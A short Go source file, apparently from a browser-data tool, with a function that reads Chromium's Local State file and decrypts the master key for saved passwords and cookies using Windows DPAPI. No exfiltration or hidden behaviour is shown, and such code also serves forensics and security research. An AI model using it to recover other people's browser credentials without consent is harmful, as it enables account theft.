package browsers

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
)

// GetMasterKey retrieves the master key for decrypting passwords and cookies from the Local State file.
// GetMasterKey retrieves the master key for decrypting passwords and cookies from the Local State file.
func (c *Chromium) GetMasterKey(path string) error {
	// Read the Local State file
	localStatePath := filepath.Join(path, "Local State")
	file, err := os.ReadFile(localStatePath)
	if err != nil {
		return fmt.Errorf("unable to read Local State file: %w", err)
	}

	// Parse the JSON content of Local State
	var data struct {
		OsCrypt struct {
			EncryptedKey string `json:"encrypted_key"`  // Corrected the JSON tags here
		} `json:"os_crypt"`  // Corrected the JSON tags here
	}
	err = json.Unmarshal(file, &data)
	if err != nil {
		return fmt.Errorf("unable to parse Local State JSON: %w", err)
	}

	// Decode the encrypted key
	encryptedKey, err := base64.StdEncoding.DecodeString(data.OsCrypt.EncryptedKey)
	if err != nil {
		return fmt.Errorf("failed to decode encrypted key: %w", err)
	}

	// Use DPAPI to decrypt the encrypted key
	c.MasterKey, err = DPAPI(encryptedKey[5:])
	if err != nil {
		return fmt.Errorf("failed to decrypt master key: %w", err)
	}

	return nil
}
